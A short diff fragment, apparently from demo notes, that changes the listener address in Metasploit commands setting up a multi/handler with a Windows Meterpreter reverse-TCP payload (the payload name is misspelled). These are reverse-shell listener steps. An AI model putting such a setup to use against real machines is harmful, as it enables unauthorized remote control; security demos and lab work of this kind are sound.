@@ -44,7 +44,7 @@ use exploit/multi/handler
 
 set payload windows/meterpreter/reverser_tcp 
 
-set lhost 10.191.5.6
+set lhost 10.191.5.5
 
 ----------------------------------------------------------------------------------------------------------
 Video Demo
